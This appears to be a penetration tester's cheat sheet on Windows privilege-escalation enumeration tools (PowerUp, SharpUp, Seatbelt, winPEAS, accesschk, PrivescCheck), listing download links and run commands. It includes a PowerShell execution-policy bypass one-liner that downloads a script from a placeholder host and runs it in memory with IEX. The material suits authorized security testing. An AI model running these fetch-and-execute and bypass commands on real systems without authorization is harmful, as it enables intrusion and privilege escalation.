# Automated Enumeration Scripts

### Power Up:

```bash
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
```

To run PowerUp, start a PowerShell session and **use dot sourcing to load the script:**

```batch
CMD> powershell -exec bypass
# Run the Invoke-AllChecks function to start checking for common privilege escalation misconfigurations.
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"
```

### **SharpUp: (If Powershell is not available)** <a href="#sharpup-if-powershell-is-not-available" id="sharpup-if-powershell-is-not-available"></a>

PowerUp & SharpUp are very similar tools that hunt for specific privilege escalation misconfigurations.

```batch
# Code: https://github.com/GhostPack/SharpUp
# Pre-Copiled: https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/blob/master/SharpUp.exe
```

To run SharpUp, start a command prompt and run the executable:

```batch
.\SharpUp.exe
```

## Seatbelt&#x20;

Seatbelt is an enumeration tool. It contains a number of enumeration checks.

It does not actively hunt for privilege escalation misconfigurations, but provides related information for further investigation.

```
# Code: https://github.com/GhostPack/Seatbelt

# Pre-Compiled: https://github.com/r3motecontrol/Ghostpa-CompiledBinaries/blob/master/Seatbelt.exe
```

To run **all checks** and filter out unimportant results:&#x20;

```
.\Seatbelt.exe all
```

To run **specific check(s):**

```
.\Seatbelt.exe <check> <check>
```

## winPEAS

winPEAS is a very powerful tool that not only actively hunts for privilege escalation misconfigurations, but highlights them for the user in the results.

```
# Code: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
```

Before running, we need to add a registry key and then reopen the command prompt:

```batch
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1
```

Run all checks while avoiding time-consuming searches:

```batch
.\winPEASany.exe quiet cmd fastch
```

Run specific check categories:

```batch
.\winPEASany.exe quiet cmd systeminfo
```

## accesschk.exe

AccessChk is an old but still trustworthy tool **for checking user access control rights.**

You can use it to check whether a user or group has access to files, directories, services, and registry keys.

The downside is more recent versions of the program spawn a GUI “accept EULA” popup window. When using the command line, we have to use an older version which still has an **/accepteula** command line option.

```
https://xor.cat/assets/other/Accesschk.zip
```

**Always do this first**

```batch
accesschk.exe /accepteula (always do this first!!!!!)
```

**Find all weak file permission per drive.**

```batch
accesschk.exe -uwqs Users c:\*.*

accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

**Find all weak folder permission per drive**

```batch
accesschk.exe -uwdqs Users c:\

accesschk.exe -uwdqs "Authenticated Users" c:\
```

## PrivescCheck

This script aims to **enumerate common Windows configuration issues** that can be leveraged for local privilege escalation. It also **gathers various information** that might be useful for **exploitation** and/or **post-exploitation**.\


```powershell
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
# From cmd

PS C:\Temp\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\Temp\> . .\PrivescCheck.ps1; Invoke-PrivescCheck
# From powershell

C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
# By default, the scope is limited to vulnerability discovery but, you can get a lot more information with the -Extended option
```
